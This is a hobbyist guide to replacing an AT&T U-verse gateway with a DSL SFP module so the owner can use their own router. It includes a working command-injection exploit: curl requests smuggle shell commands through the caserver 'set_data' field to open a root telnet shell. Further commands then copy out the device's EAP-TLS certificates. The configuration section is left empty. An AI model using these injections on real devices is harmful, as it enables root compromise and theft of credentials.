##### Background
AT&T Uverse service is a triple-play service (internet, phone, and TV) provided by AT&T - depending on what service is available in your area you may be getting FTTH (Fiber to the Home), FTTN (Fiber to the Node), or VDSL (either bonded or unbonded).

FTTN and VDSL both use VDSL2 connectivity from your house to the network. The advantage with FTTN over FTTH is reduced deployment costs for MDUs (Multiple Dwelling Units, such as condos or apartment complexes) - AT&T only has to run fiber to a local node that then serves VDSL2 to the customers.

The problem isn't the service, the problem is with the Residential Gateway that AT&T provides. It's a decently powerful unit that allows for triple play services. However, there are a lot of limitations in the RG, namely the limitation of ~8000 NAT sessions, a poor interface with very limited options, and no true passthrough.

But wait! IP Passthrough? Why not just use that? The problem is **if you're using IP Passthrough, the RG still tracks all connections going through the RG**. Once you hit the connection limit of 8000 connections, which admittedly is more than most people need, the RG will refuse new connections. 

I've also had some instances where the RG will spontaneously reboot or crash and hang when under heavy usage. I needed to explore options on how to bypass the RG and use my own (hopefully more sane) DSL modem that doesn't do any connection tracking is just a pure layer 2 bridge between AT&T's VDSL network and my router. 

Doing some research, my particular VDSL service is unbonded so it only uses one pair of copper lines. This is important because the DSL interface I'm using in this guide does not support bonded mode. 

Additionally, this is valid only for people using UVerse for internet only - if you have any other service such as TV or phone service through Uverse, this will not work for you. You'll get unfiltered internet access, but will not be able to access TV or phone service.

Why use a DSL SFP module, and not a regular consumer DSL modem? The reason for this is because every consumer DSL modem I've found uses PPPoE authentication, while Uverse uses EAPoL authentication. EAPoL authentication uses TLS based authentication with certificates, instead of a username and password. There are a few benefits to this, namely authentication is provided by certificates and not usernames and passwords, and also there is no need for MTU shifting.

There are also modems that claim to use be a "Bridge Modem", or a device that simply handles the DSL training, and then bridges the DSL interface to the Ethernet interface. However, EAPoL packets are not forwarded across bridges by design, and out of the handful of DSL "Bridge Modems" I've tried such as the Netgear DM200 or Zyxel VMG4500 do not forward EAPoL authentication packets.

The working solution I've been using is to use a SFP DSL module, which will plug into high-end consumer routers that have SFP ports or commercial \ industrial routers. I found a few companies selling DSL SFP modules and sent out a few emails asking for technical information; namely I was looking for modules that would pass EAPoL packets.

Of the companies I emailed, one replied with a slightly vague response (Versatek), one replied saying they were not interested in helping individuals (Proscend), and one responded almost immediately with actual helpful information (Netsys), stating that their modules will pass EAPoL packets. Hats off to Terry at Netsys for being so helpful and willing to answer technical questions!

In the end the decision was simple; I ordered a Netsys 100SFP-S DSL SFP module for $99 and eagerly awaited it's arrival. You can find more information about their DSL SFP module here: https://www.netsys-direct.com/collections/dsl-products/products/long-reach-ethernet-over-vdsl2-sfp-cpe-slave-nv-100sfp-s

##### Hardware Needed 
* Netsys 100SFP-S VDSL SFP module
* AT&T Uverse Router / Gateway BGW210-700
* A router that is capable of setting VLANs on the WAN / Ethernet interface, and has an SFP port
  * I'm using a Ubiquiti Unifi Security Gateway Pro 4 port. Any prosumer or professional router should allow you to set the VLAN on the WAN interface, but I haven't seen this option in consumer Linksys / Netgear etc type routers. You may need to flash an alternative firmware like OpenWRT to get this if you have a consumer grade router. Additionally, if your router does not have an SFP port, you can also just build a device that bridges an SFP module to an Ethernet interface, but that is left as an exercise for the reader. 

##### Software Needed 
* curl (already installed on recent Windows 10 builds)
* 7zip - https://www.7-zip.org/
* FileZilla - https://filezilla-project.org/
* PuTTY - https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
* mfg_dat_decode - https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html
  * Your computer may detect malware and prevent you from downloading this file. If it makes you uncomfortable, you can run it in a VM and destroy the VM when you're done. 
* AT&T UVerse RG firmware archive - https://mega.nz/file/35lBkbzC#MTrKdt57SEuz81Tn3MBKm-o_s1zv643MLmxyKILjsk8

##### Extract Certificates From AT&T UVerse RG 
1. Unzip AT&T RG Uverse firmware package - we're looking for `spTurquoise210-700_1.0.29.bin`
2. Disconnect the DSL cable from the UVerse RG. 
3. Log into your UVerse RG and downgrade the firmware with the above firmware file. The process takes several minutes and modem will reboot. 
4. After the RG is running again, go to http://192.168.1.254/cgi-bin/ipalloc.ha and assign yourself a static IP address
5. Refresh your computer's IP address to make sure you have the private IP address that was assigned.
6. Log into the UVerse RG again and authenticate
7. Run the following curl commands to start a telnet server on the UVerse modem. When prompted for the password for the user ''tech'', just hit ''ENTER''. After the last command is executed, the UVerse RG will reboot. 
  ```
  curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| echo 28telnet stream tcp nowait root /usr/sbin/telnetd -i -l /bin/nsh > /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
  ```
  ```
  curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| pfs -a /var/etc/inetd.d/telnet28|" -v --http1.1 https://192.168.1.254:49955/caserver
  ```
  ```
  curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| pfs -s|" -v --http1.1 https://192.168.1.254:49955/caserver
  ```
  ```
  curl -k -u tech -H "User-Agent: blah" -H "Connection:Keep-Alive" -d "appid=001&set_data=| reboot|" -v --http1.1 https://192.168.1.254:49955/caserver
  ```
8. Log into the UVerse RG with PuTTY using the IP address 192.168.1.254 on port 28 using the Telnet selection
9. Remount `root` file system as writeable
  ```
  mount -o remount,rw /dev/ubi0 /
  ```
10. Mount the `mfg` partition which contains the certificates
```
  mount mtd:mfg -t jffs2 /mfg
```
11.  Copy the certificate bundle to the web server directory
```
cp /mfg/mfg.dat /www/att/mfg.dat
```
12. Tar and copy the intermediate and root certificates to the web server directory
```
tar -zcvf /www/att/certs.tar.gz /etc/rootcert/
```
13. Download the certificate bundle and the intermediate and root certificates:

    http://192.168.1.254/mfg.dat
    
    http://192.168.1.254/certs.tar.gz
14. ~~Throw the UVerse RG into the garbage~~
    * Don't actually throw it in the garbage, you need to return it when you terminate your service with AT&T otherwise they will bill you a hefty sum.
    * Using the firmware archive that was downloaded earlier, you can step the UVerse back up to the current firmware by flashing 1.0.29, then 1.5.12, then 2.7.1
15. Extract the `mfg_dat_decode` utility that was downloaded earlier
16. Extract the `certs.tar.gz` archive that was downloaded earlier
17. Copy the `mfg.dat` file into the folder with the `mfg_dat_decode binary`
18. Copy all of the certificates extracted from `certs.tar.gz` into the folder with the `mfg_dat_decode` binary
19. Run the `mfg_dat_decode` binary, which will extract and create a tar.gz containing certificates and a `wpa_supplicant.conf` configuration file.
20. Extract the tar.gz file - you'll end up with a directory that contains three `pem` formatted certificates, a sample `wpa_supplicant.conf` file, and a `readme.txt` file. 

##### wpa_supplicant Configuration and Files
1. Create a new file called `uverse_eapol.sh` file using a text editor. Remember to set Unix line breaks.

  

##### Sources and References
* https://pastebin.com/SUGLTfv4
* https://en.wikipedia.org/wiki/IEEE_802.1X
* https://www.dupuis.xyz/bgw210-700-root-and-certs/
* http://earlz.net/view/2012/06/07/0026/rooting-the-nvg510-from-the-webui
* https://www.reddit.com/r/ATT/comments/g59rwm/bgw210700_root_exploitbypass/
* https://www.devicelocksmith.com/2018/12/eap-tls-credentials-decoder-for-nvg-and.html
